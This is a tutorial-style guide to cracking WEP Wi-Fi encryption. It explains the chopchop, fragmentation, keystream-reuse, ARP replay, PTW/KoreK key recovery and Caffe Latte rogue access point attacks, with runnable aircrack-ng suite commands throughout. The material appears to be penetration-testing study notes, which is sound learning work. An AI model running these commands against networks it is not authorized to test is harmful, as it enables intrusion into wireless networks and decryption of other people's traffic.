# WEP Encryption

WEP encryption uses and intialization vector combined with a key then generates a pseudorandom keystream of bits using RC4, it is then XORed with the packet and CRC32 checksum to create the output.  For these attacks; collecting enough packets to derive the IV is imperative.

## Obtaining keystreams

### Chopchop

The chopchop attack makes use of the birthday paradox involving probability theory to derive plaintext packets, by chopping appropriate bytes.  It begins by sniffing packets that are captured by a host, if captured it means the checksum is valid and makes use of the CRC32 checksum vulnerability.  As a linear function is used to calculate the CRC32 checksum the laws of mathematics allow CRC32(A+B) = CRC32(A) + CRC32(B).  Chop off the last byte in a valid frame, send an edited message to the Access Point and if the AP drops it this means your A is incorrect and needs to be recalculated with the CRC32 and a different value.  Since there are only 256 possible bytes each subsequent guesses probility for success looks like 1/256 + 1/255 + 1/254 ... with 50% success after 100 guesses.

( data | A | CRC(data+ A))
( data ) ( CRC(data + A) - CRC(A) )

Using the aireplay-ng tool for a chopchop attack

```sh
aireplay-ng -4 -h 00:09:5B:EC:EE:F2 -b 00:14:6C:7E:40:80 wlan1
aireplay-ng -4 -h <client-MAC> -b <BSSID/MAC-access-point> <interface>
```

- -4 identifies the chopchop attack
- -h client MAC address
- -b BSSID of access point
- wlan1 wireless interface

This may take some time, but the output will be a single decrypted packet and the keystream obtained.

### Fragmentation Attack

In the layers of 802.11 protocol the Data Link Layer is split into two sublayers the LLC (Logical Link Control) and MAC (Media Access Control). The LLC header also includes another header called SNAP (Subnetwork Access Protocol). SNAP is of particular interest because it is placed at the start of the encrypted part and usually has fixed contents with the first 6 bytes in the header being identical while the next two-octet fields indicate either IP or ARP. Usually ARP packets are fixed in length and 36 bytes.  Using this deduction you can obtain the first eight bytes of a keystream.  Next you can divide the packet into 16 smaller fragments and since the packet was using the same keystream you can deduce the keystream (XOR the plaintext and ciphertext) and use the 8-byte subpackets.

Using aireplay-ng to obtain the keystream

```sh
aireplay-ng -5 -b 00:14:6C:7E:40:80 -h 00:0F:B5:AB:CB:9D wlan1
aireplay-ng -5 -b <BSSID-Access-point> -h <client-MAC> <interface>
```

- -5: identifies the fragmentation attack
- -b 00:14:6C:7E:40:80: the BSSID, or the MAC address of the AP
- -h  00:0F:B5:AB:CB:9D: the MAC address of the associated client used to inject packets
- wlan1: the wireless network interface name

> **note:** Because WEP grants clients access based on a shared key, you could derive the keystream by sniffing the logon process.
>
> - (client) ==> authentication request (AP)
> - (client) <== authentication challenge (AP)
> - (client) ==> encryption challenge (AP)
> - (client) <== authentication response (AP)
>
> When you sniff the challenge plaintext and encrypted version, then by XOR-ing the two strings (argument and output) the result will be the keystream.

---

## Keystream reuse

> The  fake  authentication  attack  occurs  when  you  use  a  keystream  (collected  earlier)  to  encrypt  a  challenge  text  sent  by  an  AP.  You  can  select  any  of  the  demonstrated techniques to obtain a keystream, or you can simply sniff  an  associated  client  logon  process.  When  you  know  a  logon  process,  you  know  the  challenge  plaintext  sent  by  an  AP,  and  you  have  its  encrypted  version,  too.  By  XOR-ing  the  two  strings  (the  argument and output), the result you get is a keystream. If the key and IV are not changed, the keystream value will be the same. When authenticating, simply submit the IV of a previously captured packet in  a  response  and  use  the  obtained  keystream. 

A successfully long keystream enables you to inject a specially crafted packet that is next relayed by an access point.  There is also a way to receive packets.  The attack consists of redirecting all incoming and encrypted packets to a server outside the wireless network and having an AP decrypt the redirected messages.  The packet will consist of two fragments, an IP of a buddy server and the original message.  Compose the first fragment using a known vector and a corresponding keystream (with more fragments flag set) the other fragment is sent in original form without altering the IV, the unsuspecting AP decrypts both valid packets, combines them and relays to target.  The buddy server now only needs to send the decrypted messages to the attacker over unencrypted channel and has the capacity to now both inject and receive packets.

Using packetforge-ng after generating keystream to forge ARP packets:

```sh
packetforge-ng -0 -a <AP-BSSID> -h <client-MAC> -k <IP-ARP> -l <IP-ARP-router> -y <keystream-file> -w <output-file>
```

- -0 kind of packet ARP
- -a Access Point MAC or BSSID
- -h Client MAC
- -k IP address of the ARP request
- -l the IP of the computer which sends the request
- -y the keystream filename
- -w the output filename

---

Interactive packet replay and ARP request replay

```sh
aireplay-ng -2 -b <AP-BSSID> -t 1 -h <client-MAC> -c <Broadcast-MAC> -p 0841
```

- -2 parameter defines type of attack (interactive packet replay)
- -b AP BSSID
- -t boolean packets sent to AP?
- -h Client MAC
- -c Broadcast MAC (FF:FF:FF:FF:FF:FF)
- -p Frame Control Field

Sometimes this will not elicit the AP into responding so we cannot capture additional IVs, in which case we can try:

```sh
# attempts to capture ARP requests and replies to use for breaking network key
aireplay-ng -3 -b <AP-BSSID> --h <client-MAC> <interface>
```

- -3 parameter to make the application only process ARP requests

### Finding keys

FMS, KoreK attacks and PTW ( Fluhrer, Mantin and Shamir) attacks target RC4 applied to WEP which uses a 3 byte (24-bit) IV (Initialization Vector)concatenated with a key. By simulating the encryption process we can reconstruct the key byte by byte with a 5% chance to find the correct byte.

The FMS attack  takes  from  4,000,000  to  6,000,000  packets  to  break  WEP.  The  enhanced  KoreK  needs  just  500,000  to  2,000,000  packets.  With  PTW  meanwhile  the  capture  of  40,000  packets  gives  you  approximately  a  50%  probability  of  finding  the  key,  and  if  you  have 85,000 packets, it goes up to 95%.

Capture packets

```sh
airodump-ng -c 9 -w <packets.cap> <interface>
# - c 9 is the channel 9
# - w write packets to file
```

Using the captured ARP requests and responses file we can use aircrack-ng to determine the key (PTW)

```sh
aircrack-ng <packets.cap>
# select the # of the network
```

> PTW only needs around 50,000 packets to find the keystream 

You can alternatively use KoreK (need > 500,000 packets)

```sh
aircrack-ng -K <packets.cap>
```

#### Caffe Latte Attack

Essentially this attack is a spoof that utilizes an extra ARP request.  The attacker runs a rogue access point to automatically send positive responses to requests to join selected networks (or all networks) and uses a technique to generate ARP packets which are easy to use to determine IVs.

```sh
airbase-ng -c 9 -e name -L -W 1 <interface>
# -e name of ESSID network you want to spoof
# -L activates Caffe Latte
# -W 1 enables WEP on the rogue AP
aireplay-ng -6 -e name <interface>
# an alternative Caffe Latte implimentation
```